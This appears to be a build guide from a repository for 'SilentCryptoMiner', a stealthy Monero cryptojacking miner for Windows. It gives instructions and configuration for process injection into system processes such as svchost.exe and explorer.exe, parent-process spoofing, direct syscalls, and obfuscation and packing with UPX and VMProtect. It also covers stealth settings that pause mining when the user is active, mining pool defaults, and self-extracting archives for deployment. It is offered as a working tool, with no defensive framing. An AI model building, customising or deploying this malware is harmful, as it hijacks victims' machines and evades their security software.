# Windows Monero Edition - Building & Compilation

## Overview
This guide covers building the Windows Monero Edition miner from source.

## Requirements

### Build Environment
- **Visual Studio 2019** or higher (C++ workload)
- **Windows 10 SDK** or higher
- **Git** for version control
- **CMake 3.10+** for build configuration

### Dependencies
- **xmrig** - RandomX CPU mining library
- **openssl** - Cryptographic operations
- **pthreads** - Multi-threading support
- **SysWhispers2** - Direct syscall implementation

## Build Process

### 1. Clone Repository
```bash
git clone https://github.com/nikitacontractingltd2-lgtm/SilentCryptoMiner.git
cd SilentCryptoMiner
git checkout windows-monero-edition
```

### 2. Install Dependencies
```bash
# Using vcpkg (recommended)
vcpkg install openssl:x64-windows
vcpkg install pthread:x64-windows

# Or manually download:
# - OpenSSL binaries
# - PThreads4W
```

### 3. Configure Build
```bash
mkdir build
cd build
cmake .. -G "Visual Studio 16 2019" -A x64 \
  -DMONERO_ONLY=ON \
  -DENABLE_SYSCALLS=ON \
  -DENABLE_SPOOFING=ON
```

### 4. Build
```bash
cmake --build . --config Release -j 8
```

### Output
- `build/Release/SilentCryptoMiner.exe` - Main executable
- `build/Release/Watchdog.exe` - Watchdog process

## Architecture Support

### x64 (64-bit)
```bash
cmake .. -G "Visual Studio 16 2019" -A x64
```

### x86 (32-bit)
```bash
cmake .. -G "Visual Studio 16 2019" -A Win32
```

### ARM64
```bash
cmake .. -G "Visual Studio 16 2019" -A ARM64
```

## Build Options

| Option | Default | Description |
|--------|---------|-------------|
| `MONERO_ONLY` | ON | Build for Monero only (remove other algorithms) |
| `ENABLE_SYSCALLS` | ON | Use direct syscalls instead of Windows APIs |
| `ENABLE_SPOOFING` | ON | Enable process parent spoofing |
| `ENABLE_OBFUSCATION` | ON | Code obfuscation and string encryption |
| `RANDOMIZE_SYSCALLS` | ON | Randomize syscall indices per build |

## Customization

### Add Custom Injection Targets
Edit `src/injection/targets.cpp`:
```cpp
const char* INJECTION_TARGETS[] = {
    "svchost.exe",
    "conhost.exe",
    "dwm.exe",
    "explorer.exe",
    // Add more targets here
};
```

### Modify Stealth Behavior
Edit `src/stealth/config.h`:
```cpp
#define DEFAULT_CPU_LIMIT 70
#define DEFAULT_PAUSE_ON_ACTIVITY 1
#define DEFAULT_ACTIVITY_THRESHOLD 30
```

### Configure Pool Defaults
Edit `src/mining/pools.cpp`:
```cpp
const char* DEFAULT_POOL = "stratum+ssl://xmr.nanopool.org:14433";
const char* FALLBACK_POOL = "stratum+tcp://pool.supportxmr.com:3333";
```

## Compilation Flags

### Optimization
```
-O3 -march=native -mtune=native
```

### Security
```
-fstack-protector-strong
-fPIE -pie
-D_FORTIFY_SOURCE=2
```

### Obfuscation
```
-fno-inline
-fno-unroll-loops
-fno-merge-constants
```

## Code Signing (Optional)

Sign the executable with a certificate:
```bash
signtool sign /f certificate.pfx /p password /t http://timestamp.server.com /sha1 hash SilentCryptoMiner.exe
```

## Testing

### Local Testing
```bash
# Run with verbose logging
SilentCryptoMiner.exe --verbose --test-pool
```

### Hashrate Verification
```bash
# Test RandomX hashrate
SilentCryptoMiner.exe --benchmark 60
```

### Stealth Testing
```bash
# Test injection
SilentCryptoMiner.exe --test-injection svchost.exe
```

## Build Optimization Tips

1. **Enable LTO (Link Time Optimization)**
   ```bash
   cmake .. -DCMAKE_INTERPROCEDURAL_OPTIMIZATION=ON
   ```

2. **Use PGO (Profile Guided Optimization)**
   ```bash
   cmake .. -DENABLE_PGO=ON
   ```

3. **Reduce Binary Size**
   ```bash
   cmake .. -DSTRIP_BINARY=ON
   ```

4. **Parallel Build**
   ```bash
   cmake --build . -j$(nproc)
   ```

## Troubleshooting

### Compilation Errors

**`error: 'SysWhispers2' not found`**
```bash
git submodule update --init --recursive
```

**`error: OpenSSL headers not found`**
```bash
vcpkg integrate install
```

**`error: Windows SDK not found`**
```bash
Install Visual Studio with "Windows SDK" workload
```

### Linker Errors

**`unresolved external symbol`**
```bash
# Check vcpkg link in Visual Studio:
- Project Properties > VC++ Directories
- Add: $(VCPKG_INSTALL_DIR)\include
- Add library directories: $(VCPKG_INSTALL_DIR)\lib
```

## CI/CD Build Pipeline

GitHub Actions workflow (`.github/workflows/build.yml`):
```yaml
name: Build Windows Monero Edition
on: [push, pull_request]
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v2
      - uses: ilammy/msvc-dev-cmd@v1
      - run: |
          mkdir build
          cd build
          cmake .. -DMONERO_ONLY=ON
          cmake --build . --config Release
```

## Deployment

### Create Installer
```bash
# Using NSIS or WiX
makensis installer.nsi
```

### Create Self-Extracting Archive
```bash
7z a -sfx SilentCryptoMiner-x64.exe build/Release/*.exe build/Release/*.dll
```

## Obfuscation & Packing

Post-build obfuscation:
```bash
# UPX compression (if enabled)
upx --best SilentCryptoMiner.exe

# Code virtualization (optional)
vmprotect --virtualize SilentCryptoMiner.exe
```

---

For more information, see the main [README.md](README.md)
